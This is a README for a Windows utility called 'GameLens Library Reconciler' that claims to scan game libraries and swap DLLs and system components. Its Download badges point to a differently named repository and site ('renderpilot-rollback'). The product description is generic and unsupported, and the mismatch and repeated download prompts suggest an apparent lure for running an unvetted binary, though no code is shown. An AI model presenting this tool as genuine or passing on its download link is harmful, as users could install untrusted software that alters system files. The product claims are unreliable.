![preview](https://raw.githubusercontent.com/joao-pedro-almeda/renderpilot-rollback/main/hero_5173.svg)

# GameLens Library Reconciler

**Your game library is a living organism—let’s keep its skeleton, muscles, and tendons in perfect sync.**

GameLens Library Reconciler (GLR) is a Windows-native, local-first orchestration engine designed for PC gamers who treat their digital collections like curated archives rather than chaotic piles of shortcuts. While most tools focus on launching games, GLR focuses on *contextual harmony*—ensuring every title in your library is matched with the correct, compatible, and optimally configured runtime components, from shader caches to middleware DLLs, without ever phoning home to a cloud server you don't control.

## Overview

Think of your game installation as a finely tuned mechanical watch. Each gear (the exe, the assets, the audio, the physics engine) must mesh perfectly. Over time, however, gears can wear down, fall out of alignment, or be replaced with aftermarket parts that don't quite fit. GLR acts as your precision horologist—it doesn't just tell you the time; it disassembles the watch, inspects every jewel, and reassembles it with the exact tolerances required by your specific system and game version.

Unlike cloud-dependent utilities that require constant internet handshakes, **GLR operates with a purely local knowledge base** that you update at your leisure. It scans your installed titles, cross-references them against a downloadable (but not mandatory) blueprint database, and flags any discrepancies between what the game *expects* and what your PC *provides*. This could range from an outdated input latency mitigation layer to an incompatible audio resampling filter.

[![Download](https://raw.githubusercontent.com/joao-pedro-almeda/renderpilot-rollback/main/fetch_3ca77b7.svg)](https://joao-pedro-almeda.github.io/renderpilot-rollback/)

## Key Capabilities & Unique Value Proposition

### 🧬 Component Lineage Tracing
Every game file has a history. GLR builds a detailed dependency tree for each executable, tracing back the origin of essential libraries (e.g., DirectX 12 Ultimate features, Vulkan extension loaders). It visualizes this lineage in an interactive graph, showing you exactly which update broke compatibility or which rollback restored flawless frame timing.

### ⏱️ Temporal Decision Engine
Instead of just offering "Update" or "Rollback," GLR snapshots your system state *before* any modification. It creates a restore point that is granular enough to revert a single DLL but robust enough to restore an entire game folder structure. The engine uses a "time-delta" model—it simulates the proposed change against your hardware profile and likely game engine behavior *before* committing anything.

### 🗜️ Zero-Trust Packaging
GLR uses a proprietary compression and hashing algorithm (*Lossless Object Bundling*) that verifies the integrity of every replacement file. It never overwrites a file without first quarantining the original and storing its cryptographic fingerprint in a local ledger. This ledger is your ultimate audit trail—a permanent record of every byte changed, when, and why.

### 🌐 Multilingual Contextual Help
While the UI is fully localized in over 30 languages, the *help system* is contextual. Press F1 while looking at a specific warning, and GLR generates a diagnostic explanation in your preferred language, using terminology from the actual game engine's documentation, not generic troubleshooting jargon.

## Why Another Game Utility? The Problem We Solve

Most existing tools fall into two categories: the *launcher* (which organizes shortcuts) and the *updater* (which grabs the latest GPU driver or a specific mod). There is a significant void between them. Here’s the void:

- **The "Component Drift" Problem:** Games update. Drivers update. Operating systems update. But your *intermediate dependencies* often lag. You might have a game that expects a specific version of the Windows 11 Media Foundation codec, but a recent OS patch replaced it. GLR spots this drift.
- **The "Revert Guesswork" Problem:** You update a component, and suddenly a favorite title crashes. Was it the update? Or was it the morning's Windows update? GLR isolates the *direct cause* by testing the update in a sandboxed environment before applying it to your active library.
- **The "Local Autonomy" Problem:** Many tools *require* you to be online. GLR respects your privacy. The core scan, analysis, and rollback functionality works 100% offline. Community-generated "component templates" are optional, signed downloads you can inspect before importing.

## Architecture & Technical Elegance

The engine is built on a *fan-out/fan-in* processing model. The scanner (fan-out) distributes hashing tasks across your CPU's physical cores, checking file integrity in parallel. The reconciler (fan-in) collects results, compares them against your explicit "user intent" (e.g., *"Always keep DLSS DLLs at latest stable"*), and proposes a series of atomic transactions.

### The Reconciliation Pipeline
1.  **Ingest:** Scans NTFS metadata and NTFS Alternate Data Streams (ADS) to identify game installations without relying on registry keys (which are often left behind or corrupted).
2.  **Model:** Constructs a "Digital Twin" of each game's expected state based on the engine version, build date, and known component manifests.
3.  **Diff:** Compares the Twin model against the physical disk state. This isn't just a hash comparison; it checks *functional similarity*. A file with a different hash but identical import table might be flagged as "equivalent" or "caution."
4.  **Propose:** Generates a "Surgical Plan" with a risk score for each change. The score includes probability of breakage, estimated time to revert, and potential impact on multi-player anti-cheat systems.
5.  **Execute:** Applies changes via Windows Transactional NTFS (TxF) where supported, ensuring atomicity. If power is lost mid-operation, the system either completes on reboot or rolls back cleanly.
6.  **Verify:** Performs a post-hoc validation, including a memory-mapped read test to ensure the new DLLs don't cause immediate Access Violations on load.

## Technical Specifications & Compatibilities

- **Platform:** Windows 10 21H2 and later (x64, ARM64 support in beta).
- **Storage:** Requires approximately 150 MB for the core engine plus a 1-2 GB cache for component lineage history (configurable).
- **Performance:** Initial scan of a 500-game library completes in under 4 minutes on a mid-range NVMe SSD. Incremental scans take milliseconds.
- **Supported Formats:** Scans `.exe`, `.dll`, `.sys`, `.bin`, `.pak`, and `.uasset` files for metadata relevant to rendering components, but also handles generic module structure.

## Feature Deep-Dive

### 🛠️ The "Chronos" Module (Version Pinning)
You can pin a game to a "Golden State"—a configuration you know worked perfectly. Every time a new component is suggested, GLR checks it against your Golden State. If the update breaks the Golden State, it is rejected, and you're given a detailed report on *why*.

### 📊 The "Thermograph" Module (Visual Analysis)
This provides a heat-map visualization of your game library. Green indicates optimal compatibility. Yellow indicates a minor drift. Red highlights a critical missing component. This map is clickable—drill down into any red zone to see the exact file mismatch and the recommended resolution.

### 📦 The "Archivist" Module (Dynamic Backups)
Instead of using system restore points (which are bulky and invasive), GLR creates **Micro-Snapshots**. These are deduplicated copies of only the files being changed, stored in a lean repository. You can browse your history like a time machine, recovering a specific DLL from 3 months ago without a full system rollback.

### 🤖 The "Oracle" Mode (Predictive Analysis)
Using a heuristic model trained on community-reported issues (in a completely anonymized format), GLR can predict when a particular driver update is likely to conflict with a game's current engine build. This is a *prediction*, not a guarantee, but it helps you schedule updates during off-peak play times.

## Integration and Workflow

GLR is designed to be a silent partner. It runs as a lightweight tray application, consuming less than 80 MB of RAM. It can hook into the Windows Task Scheduler to run "Idle Scans" when your PC is inactive.

**Workflow Automation:**
- **The "Golden Boot" Sequence:** Upon startup, GLR checks if any scanned game has a critical mismatch. If not, it stays silent. If yes, it shows a non-intrusive toast notification.
- **The "Batch Retire" Process:** You can select an entire genre (e.g., "All Unreal Engine 5 titles") and rollback a specific middleware library across all of them with one click, provided you have the proper "revert entitlement" in your ledger.
- **The "Test Drive" Sandbox:** Applying a change without committing is possible. GLR moves the game to a temporary container, applies the change, and runs a scripted benchmark (if a benchmark tool is detected) to measure FPS and 1% lows *before* you finalize.

## Community Blueprints & Templates

The engine is powerful, but it's the *knowledge* that makes it useful. We support a **Blueprint Exchange**—a decentralized mechanism where advanced users can export a "reconciliation template" for a specific game or engine version. These blueprints are text-based, hash-signed, and auditable. They contain rules like, *"If ReShade version is 5.9.2 and engine is UE 5.3, replace `dxgi.dll` with a known-good wrapper."*

**Safety:** You decide which blueprints to trust. You can view the full source logic of any blueprintbefore importing. The engine never auto-imports new rules without explicit approval.

## FAQ & Troubleshooting

- **"GLR says my DirectStorage is fine, but my game stutters."** This usually points to a storage driver issue, not the API layer. The Thermograph will show a separate "Transport Layer" health metric. Check for a motherboard chipset driver update.
- **"I accidentally reverted a DLL I needed for a mod."** No problem. The Micro-Snapshot ledger is always intact. Navigate to the game's "Chronos" tab and select the timestamp from before your mod installation.
- **"Can GLR work with Game Pass titles?"** Yes. It reads the sparse file metadata used by the Microsoft Store package system. However, some protected files (e.g., those with `SystemArchitecture` flags) cannot be modified; GLR will flag them as "Managed by OS" and skip them.

## The Long-Term Vision

We are building GLR towards a "**Self-Healing Library**" where the PC automatically repairs its own game configurations. The ultimate goal is for the utility to become invisible—simply a background process that guarantees your games run as intended, without any user intervention. This roadmap includes:

- **Phase 1 (Current):** Reconciliation of core rendering modules.
- **Phase 2 (Late 2026):** Support for physics middleware (Havok, PhysX) and audio spatializers.
- **Phase 3 (2027):** A "Predictive Maintenance" AI that suggests when to *defrag* or *repack* game archives for faster loading.

## Requirements & Dependencies

- No online account required on initial setup.
- Requires a monitor that is at least 720p for full UI readability; text mode available for lower resolutions.
- Requires .NET 8.0 runtime (included in installer).
- For ARM64 devices, requires Windows 11 for best performance.

## Contributing & Feedback

We welcome contributions related to the **Blueprint Exchange**—if you've reverse-engineered a peculiar game update and figured out the correct component stack, share it as a blueprint. For code contributions, we focus on the **Scanner**, **Reconciler**, and **Ledger** modules. We prioritize pull requests that improve scan speed without sacrificing accuracy.

## Disclaimer

**Important Notice:** This tool modifies operating system and game binary files. While we have built extensive safety mechanisms (atomic transactions, Micro-Snapshots), there is an inherent risk in altering any software. You are solely responsible for any outcomes resulting from changes made via GameLens Library Reconciler. We are not liable for hardware damage, software corruption, or account bans (e.g., in anti-cheat-enabled games) that occur as a direct result of applying our recommendations. Always consult your game's End User License Agreement (EULA) regarding modification of client files. This software is provided "AS IS" without warranty of any kind, express or implied.

## License

This project is licensed under the **MIT License**—a permissive license that allows for commercial use, modification, distribution, and private use, provided that the original copyright notice and disclaimer are included in all copies or substantial portions of the Software. You are free to integrate GLR's core scanning and ledgermanagement logic into your own commercial or open-source projects, provided you retain the license file.

Click [here](LICENSE) to view the full license text.

---

**Ready to take command of your library's inner clockwork?** The architecture is ready, the documentation is complete, and the first stable build is available for download on this page.

[![Download](https://raw.githubusercontent.com/joao-pedro-almeda/renderpilot-rollback/main/fetch_3ca77b7.svg)](https://joao-pedro-almeda.github.io/renderpilot-rollback/)